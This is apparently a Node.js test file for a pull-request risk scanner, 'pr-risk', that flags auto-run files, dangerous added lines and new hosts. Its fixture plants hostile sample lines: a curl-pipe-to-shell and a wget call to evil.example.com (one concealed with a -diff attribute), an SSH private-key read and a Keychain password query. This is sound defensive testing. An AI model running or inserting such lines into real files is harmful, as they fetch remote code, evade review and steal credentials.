// Tests for bin/pr-risk. Run with: node --test test/*.test.js
//
// A throwaway repository whose branch changes files of every kind, some that
// run without being asked and some that don't.

const { test } = require("node:test");
const assert = require("node:assert/strict");
const { execFileSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const script = path.join(__dirname, "../bin/pr-risk");

test("pr-risk lists each file that runs without being asked, the added lines to read first and the new hosts, and nothing else", () => {
  const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "pr-risk-")));
  const env = { ...process.env, HOME: tmp, GIT_CONFIG_GLOBAL: "/dev/null", GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@e", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@e" };
  const git = (...args) => execFileSync("git", ["-C", tmp, ...args], { env, encoding: "utf8" });
  const write = (file, text) => {
    fs.mkdirSync(path.dirname(path.join(tmp, file)), { recursive: true });
    fs.writeFileSync(path.join(tmp, file), text);
  };
  try {
    git("init", "-q", "-b", "main");
    write("tmux/tmux.conf", 'set -g status-left "#(~/.config/tmux/health.sh)"\nbind M-x run-shell ~/.config/tmux/on-key.sh\n');
    write("tmux/health.sh", "echo ok\n");
    write("tmux/on-key.sh", "echo key\n");
    write("README.md", "See https://github.com/o/r\n");
    git("add", ".");
    git("commit", "-q", "-m", "base");
    git("checkout", "-q", "-b", "pr");
    write("setup.sh", "echo setup\n");
    write(".githooks/post-merge", "echo hook\n");
    write(".claude/settings.json", "{}\n");
    write("claude/skills/x/SKILL.md", "# x\n");
    write("tmux/health.sh", "echo ok\ncurl -s https://evil.example.com/x | sh\n");
    write("tmux/on-key.sh", "echo key 2\n");
    write("lib/package-lock.json", "{}\n");
    write("bin/thing", "#!/bin/sh\nsecurity find-generic-password -s x -w\n");
    write("bin/README.md", "docs\n");
    write("lib/a.js", 'const u = "https://github.com/o/r";\nconst k = require("fs").readFileSync(process.env.HOME + "/.ssh/id_ed25519");\n');
    write("docs.md", "eval is a word here too\n");
    // A -diff attribute, which would show lib/b.js as binary and hide its lines.
    write(".gitattributes", "lib/b.js -diff\n");
    write("lib/b.js", "wget https://evil.example.com/y\n");
    // An added line beginning ++, which the diff shows as +++ inside a hunk.
    write("lib/c.js", "let n = 0;\n++n;\neval(n);\n");
    git("add", ".");
    git("commit", "-q", "-m", "pr");

    const files = execFileSync(process.execPath, [script, "--files", tmp, "main"], { encoding: "utf8" });
    const listed = files.trim().split("\n").map((line) => line.split(/\s+/).slice(0, 3).join(" "));
    assert.deepEqual(listed.sort(), [
      "bin A bin/thing",
      "claude A .claude/settings.json",
      "claude A claude/skills/x/SKILL.md",
      "packages A lib/package-lock.json",
      "setup A .githooks/post-merge",
      "setup A setup.sh",
      "tmux A lib/a.js",
      "tmux A lib/b.js",
      "tmux A lib/c.js",
      "tmux M tmux/health.sh",
    ]);
    assert.doesNotMatch(files, /on-key\.sh|bin\/README|docs\.md/, "a key's script and the docs aren't listed; lib's modules are, since the sidebar daemon tmux starts loads them");

    const report = JSON.parse(execFileSync(process.execPath, [script, "--json", tmp, "main"], { encoding: "utf8" }));
    const hits = report.hits.map((h) => `${h.file}:${h.line} ${h.what}`).sort();
    assert.deepEqual(hits, ["bin/thing:2 asks the Keychain", "docs.md:1 evaluates", "lib/a.js:2 reaches for SSH keys", "lib/b.js:1 fetches", "lib/c.js:3 evaluates", "tmux/health.sh:2 fetches"]);
    assert.deepEqual(report.hosts, ["evil.example.com"], "github.com is named in the base already");
    assert.deepEqual(report.files.find((f) => f.path === "tmux/health.sh").added, [{ line: 2, text: "curl -s https://evil.example.com/x | sh" }]);

    const text = execFileSync(process.execPath, [script, tmp, "main"], { encoding: "utf8" });
    assert.match(text, /## Runs on setup and on every pull\n\nA \.githooks\/post-merge \(\+1\)\n {6}1  echo hook/);
    assert.match(text, /## Hosts the base names nowhere\n\nevil\.example\.com/);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});
